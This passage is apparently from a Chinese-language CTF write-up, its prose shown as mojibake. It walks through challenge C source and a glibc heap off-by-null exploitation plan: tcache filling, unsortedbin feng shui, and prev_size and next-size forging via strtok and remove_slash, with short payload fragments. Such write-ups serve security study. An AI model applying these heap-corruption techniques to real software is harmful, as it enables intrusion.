<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xfree</span><span class="params">(<span class="keyword">void</span> *ptr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ptr) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> size = malloc_usable_size(ptr);</span><br><span class="line">    bzero(ptr, size);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ <code>malloc_usable_size</code>  å‡½æ•°ä¼šè·å–è¯¥ heap æ‰€æœ‰èƒ½å†™çš„ sizeï¼Œä¹Ÿå°±æ˜¯è¯´ç´§é‚»è¯¥å †å—çš„ä¸‹ä¸€ä¸ªå †å—çš„ <code>prev_size</code>  ä¹Ÿä¼šè¢«ç®—è¿›æ¥æ¸…é›¶ï¼Œå› æ­¤æˆ‘ä»¬è¦é¿å¼€ xfreeï¼Œåªèƒ½ç”¨ <code>xrealloc</code>  æ¥ freeã€‚</p>
<p><code>xrealloc</code>  å…¶å®å°±æ˜¯è°ƒç”¨ <code>realloc</code>  å‡½æ•°ï¼Œå½“æˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå¤§äºå½“å‰å †å— size çš„å †å—æ—¶ï¼Œ <code>realloc</code>  ä¼š free æ‰å½“å‰å †å—ï¼Œç„¶åé‡æ–°ç”³è¯·å †å—ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­æ˜¯ä¸ä¼šæ¸…ç©º free çš„å †å—å†…å®¹çš„ã€‚</p>
<p>å°å †é£æ°´ä¸€æ³¢ï¼Œå¾—åˆ°ä¸€ä¸ªå¡«æ»¡ 0x408 éé›¶å­—èŠ‚çš„ <code>gbuff</code>  å †å—æ­¥éª¤ä¸ºï¼š</p>
<ol>
<li>å…ˆåˆ©ç”¨ rip ç”³è¯·ä¸€ä¸ª 0x400 å¤§å°çš„å †å—ï¼Œç„¶ååˆ©ç”¨ xrealloc ä¸æ–­æ‰©å……ï¼Œç›´åˆ° size ä¸º 0x1000ã€‚ç„¶å realloc (0x1100) free æ‰è¯¥ unsortedbinï¼ˆå¿…é¡»ç”¨ xrealloc å» freeï¼Œç”¨ xfree ä¼šæ¸…ç©ºå †å—å†…å®¹ï¼‰ã€‚</li>
<li>ç”³è¯·ä¸€ä¸ªå°å †å—éš”å¼€ <code>unsortedbin</code>  ä¸ <code>top_chunk</code> ã€‚</li>
<li>ç”³è¯·ä¸€ä¸ª 0x400 å¤§å°çš„å †å—åˆ° unsortedbin ä¸­ã€‚</li>
<li>æå‰å¡«æ»¡ 0x400 å¤§å°çš„ <code>tcache_list</code> ã€‚</li>
<li>è°ƒç”¨ <code>cmd_irl</code>  æ¥ free æ‰ <code>gbuff</code> ï¼Œç”±äº <code>tcache_list</code>  å·²ç»è¢«å¡«æ»¡ï¼Œå› æ­¤ free æ‰çš„ <code>gbuff</code>  ä¸ä¼šè¿›å…¥ <code>tcache_list</code> ï¼Œä¼šå˜æˆ unsortedbinï¼Œç„¶åä¸‹ä¸€æ¬¡ç”³è¯·ï¼Œä¼šç”³è¯· <code>tcache_list</code>  ä¸­ç¬¬ä¸€ä¸ªç©ºé—²å †å—ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¹‹å‰å¡«æ»¡éé›¶å­—èŠ‚çš„ä¸€ä¸ªå †å—ã€‚è¿™æ ·å°±èƒ½è·å¾—ä¸€ä¸ªå¡«æ»¡ 0x408 å­—èŠ‚çš„ <code>gbuff</code> ã€‚</li>
</ol>
<h4 id="æ„é€ off-by-null-2"><a class="markdownIt-Anchor" href="#æ„é€ off-by-null-2">#</a> æ„é€  off by null</h4>
<p>æ¥ä¸‹æ¥å°±å¾ˆç®€å•èƒ½å¤Ÿæƒ³åˆ°åœ¨ <code>gbuff</code>  çš„ä¸‹é¢ç”³è¯·ä¸€ä¸ªå †å—ï¼Œ <code>off-by-null</code>  ä¹‹ååˆ©ç”¨ï¼Œä»¥ä¸‹æ–‡ç« å°†è¯¥å †å—å‘½åä¸º <code>off-by-null-chunk</code></p>
<p>åœ¨æ€è€ƒè¿™ä¸€æ®µæ—¶ï¼Œå¡äº†æˆ‘éå¸¸ä¹…ï¼Œç‰¹åˆ«é¸£è°¢ <code>winmt</code>  å¸ˆå‚…å’Œ <code>ln3</code>  å¸ˆå‚…å’Œæˆ‘æ¿€æƒ…è®¨è®ºï¼Œä¸€æ¬¡æ¬¡ç‚¹é†’æˆ‘ã€‚</p>
<h5 id="é‡åˆ°çš„é—®é¢˜"><a class="markdownIt-Anchor" href="#é‡åˆ°çš„é—®é¢˜">#</a> é‡åˆ°çš„é—®é¢˜</h5>
<h6 id="prev_size"><a class="markdownIt-Anchor" href="#prev_size">#</a> prev_size</h6>
<p>â‘  <code>off-by-null-chunk</code>  çš„ <code>prev_size</code>  æˆ‘ä»¬æ— æ³•æ§åˆ¶ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œ <code>off-by-null-chunk</code>  çš„ <code>prev_size</code>  æ˜¯è¢«å¡«æ»¡äº†å…«å­—èŠ‚çš„ï¼Œä¸ç„¶æ— æ³•è§¦å‘ <code>strtok</code>  ç„¶åè§¦å‘ <code>off-by-null</code> ã€‚</p>
<p><code>gbuff</code>  å †å—ä¸ <code>off-by-null-chunk</code>  æ˜¯ç´§æŒ¨çš„ï¼Œç„¶åæˆ‘ä»¬å¦‚æœè¦æ›´æ”¹ <code>off-by-null-chunk</code>  çš„ <code>prev_size</code> ï¼Œå°±å¿…é¡»é€šè¿‡ <code>gbuff</code>  æ¥æ›´æ”¹ã€‚</p>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œæˆ‘ä»¬åªèƒ½æ§åˆ¶ <code>gbuff</code>  å †å—çš„å‰ 0x400 ä¸ªå­—èŠ‚ï¼Œæ›´æ”¹ä¸äº† <code>off-by-null-chunk</code>  çš„ <code>prev_size</code> ã€‚</p>
<p><strong>å°è¯•æ€è·¯ä¸€</strong>ï¼šé¦–å…ˆè‚¯å®šè¦è§¦å‘ <code>off-by-null</code> ï¼Œæˆ‘æƒ³çš„æ˜¯è§¦å‘ <code>off-by-null</code>  ä¹‹åï¼Œå†æ¬¡è°ƒç”¨ <code>cmd_irl</code>  æ¥ free æ‰ <code>gbuff</code> ï¼Œç„¶åç”³è¯·ä¸€ä¸ªæ™®é€š chunkï¼Œsize ä¸º 0x408ï¼Œè¿™æ ·å°±èƒ½æ›´æ”¹åˆ° <code>off-by-null-chunk</code>  çš„ <code>prev_size</code> ã€‚</p>
<p>ä½†æ˜¯è¿™æ ·æ˜¯æ˜¾ç„¶è¡Œä¸é€šçš„ï¼Œå› ä¸º free æ‰ <code>gbuff</code>  çš„æ—¶å€™ï¼Œä¼šåˆ¤æ–­ <code>gbuff</code>  ä¸‹é¢é‚£ä¸ªå †å—çš„ use çŠ¶æ€ï¼Œç”±äºå·²ç» <code>off-by-null</code> ï¼Œä¼šè§¦å‘ <code>off-by-null</code> ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ <code>prev_size</code>  ä¸åˆæ³•ï¼Œè¿™æ ·ä¼šå¯¼è‡´ç¨‹åºå‡ºé”™ã€‚</p>
<p><strong>å°è¯•æ€è·¯äºŒ</strong>ï¼šæˆ‘è¯¦ç»†æŸ¥é˜…äº† strtok çš„ä½œç”¨ï¼Œå¦‚æœå‡ºç°è¿ç»­çš„ delim åˆ†éš”ç¬¦ä¼šå¦‚ä½•å¤„ç†ï¼Œçœ‹èƒ½ä¸èƒ½åŒæ—¶åˆ©ç”¨ strtok å°† <code>gbuff</code>  ç¬¬ 0x400-0x408 ä¸ªå­—èŠ‚ä¸­é <code>prev_size</code>  éƒ¨åˆ†æ¸…ç©ºï¼ŒåŒæ—¶è§¦å‘ <code>off-by-null</code> ã€‚æœ€ç»ˆä¹Ÿä»¥å¤±è´¥å‘Šç»ˆã€‚</p>
<p><strong>æœ€ç»ˆæ€è·¯</strong>ï¼šå†æ¬¡å®¡æŸ¥æºç åï¼Œå‘ç° <code>cmd_rip</code>  å‡½æ•°ä¸­ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">cmd_rip</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *fname = strtok(<span class="literal">NULL</span>, delim);#<span class="meta">#this!</span></span><br><span class="line">    <span class="keyword">char</span> *rbuff = xmalloc(SBSIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Redirect input to stdout */</span></span><br><span class="line">    <span class="keyword">if</span> (!fname) &#123;</span><br><span class="line">        read_max(rbuff, SBSIZE);</span><br><span class="line">        write_str(rbuff);</span><br><span class="line">        write_str(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        xfree(rbuff);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Redirect input to a file */</span></span><br><span class="line"></span><br><span class="line">    remove_slash(fname);<span class="meta">#that!</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(fname) == <span class="number">0</span>) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;rip: flag = âˆ…\n&quot;</span>);</span><br><span class="line">        xfree(rbuff);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Special case: flag1 cannot be altered */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(fname, <span class="string">&quot;flag1&quot;</span>)) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;rip: Â¬ perm\n&quot;</span>);</span><br><span class="line">        xfree(rbuff);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span> <span class="comment">/* ignore flag1 */</span>; i &lt; FILEMAX; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (gfiles[i] &amp;&amp; gfiles[i]-&gt;fname &amp;&amp; !<span class="built_in">strcmp</span>(gfiles[i]-&gt;fname, fname)) &#123;</span><br><span class="line">            <span class="comment">/* The file&#x27;s owner must be root or the current user, and the file must be writable */</span></span><br><span class="line">            <span class="keyword">if</span> ((curr_uid != <span class="number">0</span> &amp;&amp; gfiles[i]-&gt;fuid != curr_uid) || !(gfiles[i]-&gt;fflag &amp; WRPERM)) &#123;</span><br><span class="line">                write_str(<span class="string">&quot;rip: Â¬ perm\n&quot;</span>);</span><br><span class="line">                xfree(rbuff);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read_max(rbuff, SBSIZE);</span><br><span class="line">            <span class="keyword">if</span> (gfiles[i]-&gt;fdata) &#123;</span><br><span class="line">                <span class="comment">/* File is not empty -&gt; rewrite the file content */</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strlen</span>(rbuff) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    gfiles[i]-&gt;fdata = xrealloc(gfiles[i]-&gt;fdata, <span class="built_in">strlen</span>(gfiles[i]-&gt;fdata) + <span class="built_in">strlen</span>(rbuff) + <span class="number">1</span>); <span class="comment">// Remember the extra null byte</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">strcat</span>(gfiles[i]-&gt;fdata, rbuff);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* File is empty -&gt; write the content directly */</span></span><br><span class="line">                gfiles[i]-&gt;fdata = strdup(rbuff);</span><br><span class="line">            &#125;</span><br><span class="line">            xfree(rbuff);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    write_str(<span class="string">&quot;rip: \&quot;&quot;</span>);</span><br><span class="line">    write_str(fname);</span><br><span class="line">    write_str(<span class="string">&quot;\&quot; âˆ‰ â„±\n&quot;</span>);</span><br><span class="line">    xfree(rbuff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ä»£ç ä¸­æˆ‘æ³¨é‡Šçš„ this å’Œ that éƒ¨åˆ†ã€‚</p>
<p>å…³æ³¨åˆ° <code>remove_slash</code>  å‡½æ•°ï¼Œä¼šå°†å­—ç¬¦ä¸²ä¸­å« \ çš„éƒ¨åˆ†ç½®ä¸º \x00ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_slash</span><span class="params">(<span class="keyword">char</span> *fname)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fname_len = <span class="built_in">strlen</span>(fname);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fname_len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fname[i] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            fname[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶ä¹Ÿæ˜¯é€šè¿‡ <code>strlen</code>  æ¥åˆ¤æ–­é•¿åº¦ã€‚</p>
<p><code>menu</code>  ä¸ <code>cmd_rip</code>  å‡½æ•°ä¸­ï¼ŒæŒ‰å…ˆåé¡ºåºè°ƒç”¨äº†å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *token = strtok(gbuff, delim);</span><br><span class="line"><span class="keyword">char</span> *fname = strtok(<span class="literal">NULL</span>, delim);#<span class="meta">#this!</span></span><br><span class="line">remove_slash(fname);<span class="meta">#that!</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœæˆ‘ä»¬æ„é€ è¿™æ ·çš„ payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;rip.&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x400</span>-<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<p>åŒæ—¶ï¼Œåœ¨ä¹‹å‰å †é£æ°´å†™ <code>gbuff</code>  çš„ç¬¬ 0x400-0x408 å­—èŠ‚ï¼Œè‹¥æˆ‘ä»¬å¡«å…¥å¦‚ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p16(prev_size)+<span class="string">b&#x27;\&#x27;*6</span></span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆåœ¨æ‰§è¡Œç¬¬ä¸€å¥è¯­å¥ä¹‹åï¼Œè¿”å›çš„æŒ‡é’ˆå·²ç»æŒ‡å‘</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x400</span>-<span class="number">4</span>)+p16(prev_size)+<span class="string">b&#x27;\&#x27;*6</span></span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ strtok ç¬¬ä¸€ä¸ªå‚æ•°ä¸º NULL æ—¶ï¼Œç»§æ‰¿çš„æ˜¯ä¸Šä¸€æ¬¡ strtok è¿”å›çš„æŒ‡é’ˆã€‚</p>
<p>å› æ­¤æ‰§è¡Œç¬¬äºŒå¥è¯­å¥ä¹‹åï¼Œèƒ½å¤Ÿå°† <code>off-by-null</code>  çš„ size å¤´ä½ä½ 0x21 ç½®ä¸º 0ï¼Œè§¦å‘ <code>off-by-null</code></p>
<p>åŒæ—¶ï¼Œæ‰§è¡Œç¬¬ä¸‰å¥è¯­å¥ï¼Œå°†è°ƒæ•´æˆ‘ä»¬çš„ <code>prev_size</code>  ä¸ºæ­£å¸¸ã€‚</p>
<p>å› æ­¤è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»æ„é€ å¥½ <code>prev_size</code> ã€‚</p>
<h6 id="fake_size"><a class="markdownIt-Anchor" href="#fake_size">#</a> fake_size</h6>
<p>æˆ‘ä»¬çŸ¥é“ï¼Œfree ä¸€ä¸ªå †å—ï¼Œä¼šå»æ£€æµ‹ä¸‹ä¸€ä¸ªå †å—çš„ <code>next_size</code>  æ˜¯å¦åˆæ³•ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬ free æ‰ <code>off-by-null-chunk</code>  çš„æ—¶å€™ï¼Œé™¤é <code>off-by-null-chunk</code>  çš„ size æœ¬èº«ä¸º <code>0x501</code>  è¿™ç§ï¼Œoff by null ä¹‹åä¸ç”¨ä¼ªé€  <code>next_size</code> ã€‚å¦åˆ™éœ€è¦ä¼ªé€ åˆæ³•çš„ <code>next_size</code> ï¼Œä¸ç„¶ free ä¼šè§¦å‘é”™è¯¯ã€‚</p>
<p>ä¼ªé€  <code>next_size</code>  çš„è¿‡ç¨‹å‡ ä¹æ²¡æœ‰å¸Œæœ›çš„ï¼Œä¹‹å‰çœ‹æ¥ï¼š</p>
<p>é¦–å…ˆ <code>off-by-null-chunk</code>  çš„ size éœ€è¦å¤§äº 0x400ï¼ˆä¸èƒ½åœ¨ tcache èŒƒå›´ï¼‰ï¼Œåœ¨ tcache èŒƒå›´å†…çš„ <code>tcache_off-by-null</code>  æ˜¯æ²¡æœ‰ä½œç”¨çš„ã€‚</p>
<p>è¿™å°±æ„å‘³ç€æˆ‘ä»¬ç”³è¯·çš„ <code>off-by-null-chunk</code>  çš„ size éœ€è¦å¤§äº 0x400ï¼Œé‚£å°±åªèƒ½è°ƒç”¨ <code>cmd_rip</code>  æ¥ç”³è¯·ï¼Œå…¶ä»–éƒ½ä¸èƒ½ç”³è¯·å¤§äº 0x400 size çš„ chunkã€‚è€Œ <code>cmd_rip</code>  çš„æ“ä½œæ˜¯æ ¹æ® <code>strlen</code>  å‡½æ•°è¿”å›çš„é•¿åº¦æ¥è¿›è¡Œ <code>realloc</code>  çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ç”³è¯·å‡ºæŸä¸ª size çš„å †å—ï¼Œå°±å¿…é¡»å¡«æ»¡ä»–ã€‚</p>
<p><code>cmd_rip</code>  ä¸­éƒ¨åˆ†ä»£ç ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span> <span class="comment">/* ignore flag1 */</span>; i &lt; FILEMAX; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (gfiles[i] &amp;&amp; gfiles[i]-&gt;fname &amp;&amp; !<span class="built_in">strcmp</span>(gfiles[i]-&gt;fname, fname)) &#123;</span><br><span class="line">            <span class="comment">/* The file&#x27;s owner must be root or the current user, and the file must be writable */</span></span><br><span class="line">            <span class="keyword">if</span> ((curr_uid != <span class="number">0</span> &amp;&amp; gfiles[i]-&gt;fuid != curr_uid) || !(gfiles[i]-&gt;fflag &amp; WRPERM)) &#123;</span><br><span class="line">                write_str(<span class="string">&quot;rip: Â¬ perm\n&quot;</span>);</span><br><span class="line">                xfree(rbuff);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            read_max(rbuff, SBSIZE);</span><br><span class="line">            <span class="keyword">if</span> (gfiles[i]-&gt;fdata) &#123;</span><br><span class="line">                <span class="comment">/* File is not empty -&gt; rewrite the file content */</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">strlen</span>(rbuff) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    gfiles[i]-&gt;fdata = xrealloc(gfiles[i]-&gt;fdata, <span class="built_in">strlen</span>(gfiles[i]-&gt;fdata) + <span class="built_in">strlen</span>(rbuff) + <span class="number">1</span>); <span class="comment">// Remember the extra null byte</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">strcat</span>(gfiles[i]-&gt;fdata, rbuff);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">/* File is empty -&gt; write the content directly */</span></span><br><span class="line">                gfiles[i]-&gt;fdata = strdup(rbuff);</span><br><span class="line">            &#125;</span><br><span class="line">            xfree(rbuff);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æˆ‘ä»¬è¦ä¼ªé€  <code>fake_next_size</code> ï¼Œ <code>fake_next_size</code>  ä¸­è‚¯å®šå¸¦ <code>\x00</code>  æˆªæ–­ï¼ŒåŒæ—¶ç”±äº <code>off-by-null-chunk</code>  åŸæœ¬ size ä½å­—èŠ‚ä¸º 0x21ï¼Œè¢«æ”¹æˆ \x00 åï¼Œ <code>fake_next_size</code>  è¦æ”¾åœ¨ <code>off-by-null-chunk</code>  çš„ + 0x500 å¤„ï¼Œä¾‹å¦‚å¦‚ä¸‹ç»“æ„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">off-by-null-chunkï¼š</span><br><span class="line">	0 0x500(0x521)</span><br><span class="line">	........</span><br><span class="line">	........</span><br><span class="line">	padding,fake_next_size</span><br><span class="line">	padding,paddingã€‚</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ padding ä¸º 8 éé›¶å­—èŠ‚ã€‚å¯ä»¥æ³¨æ„åˆ° <code>fake_next_size</code>  ä¸­å¸¦ \x00 æˆªæ–­ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ç”³è¯·åˆ° 0x521 å¤§å°çš„ chunkã€‚</p>
<p>æƒ³è¿‡å¾ˆå¤šç§æ–¹æ³•ï¼Œä¾‹å¦‚åˆ©ç”¨ <code>realloc</code>  å»è¿›è¡Œä¸€äº› trickï¼Œä¾‹å¦‚ï¼š</p>
<p>å…ˆç”³è¯·å‡º 0x521 å¤§å°çš„ chunkï¼Œç„¶ååˆ©ç”¨ <code>cmd_wtf</code>  é‡Œçš„ <code>strcpy</code>  å¾€é‡Œå¡«å…¥é›¶å­—èŠ‚ï¼Œå†åˆ©ç”¨ <code>cmd_rip</code>  æ¥ realloc åˆ°é€‚å½“å­—èŠ‚ï¼Œæ°å¥½å†™è¿› <code>fake_next_size</code> ï¼Œä½†æ˜¯å¯¹ä¸€ä¸ªå†…å­˜å¤§äºç”³è¯· size çš„å †å—è¿›è¡Œ <code>realloc</code> ï¼Œä¼š free æ‰å‰©ä½™ size çš„å° chunkï¼š</p>
<p>ä¾‹å¦‚å¯¹ 0x521 chunk è¿›è¡Œ <code>reallc(ptr,0x410)</code> ï¼Œä»–ä¼š free æ‰å‰©ä½™çš„ 0x100 å­—èŠ‚ã€‚è¿™æ ·ä¼šç ´åæ‰åŸæ¥ chunk çš„ size å¤´ï¼Œå¯¼è‡´æˆ‘ä»¬ä¸èƒ½è§¦å‘ <code>off-by-null</code> ã€‚</p>
<p>å¯è§å¯¹å¤§äº 0x400 size çš„ chunk å»å†™å…¥ä¸€ä¸ª <code>fake_next_size</code>  æ˜¯éå¸¸å›°éš¾çš„ã€‚</p>
<p>è½¬æ¢æ€è·¯å‘¢ï¼Ÿå¯èƒ½ä¸€å¼€å§‹å°±æƒ³é”™äº†ï¼Œä¸ºä»€ä¹ˆ <code>off-by-null-chunk</code> size ä¸€å®šè¦å¤§äº 0x400 å‘¢ï¼Ÿä»–çš„ size å¯ä»¥æ˜¯ 0x321ï¼Œåªè¦æˆ‘ä»¬æå‰å¡«æ»¡å¯¹åº” size çš„ <code>tcache_list</code>  å³å¯ã€‚</p>
<p>è€Œå¦‚æœ size å°äº 0x400ï¼Œæˆ‘ä»¬è§‚å¯Ÿ <code>cmd_wtf</code>  å‡½æ•°ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_wtf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *fdata = strtok(<span class="literal">NULL</span>, delim);</span><br><span class="line">    <span class="keyword">if</span> (!fdata) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;wtf: data âˆˆ âˆ…\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *fname = strtok(<span class="literal">NULL</span>, delim);</span><br><span class="line">    <span class="keyword">if</span> (!fname) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;wtf: file âˆˆ âˆ…\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_slash(fname);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(fname) == <span class="number">0</span>) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;wtf: file = âˆ…\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Special case: flag1 cannot be altered */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(fname, <span class="string">&quot;flag1&quot;</span>)) &#123;</span><br><span class="line">        write_str(<span class="string">&quot;wtf: Â¬ perm\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span> <span class="comment">/* ignore flag1 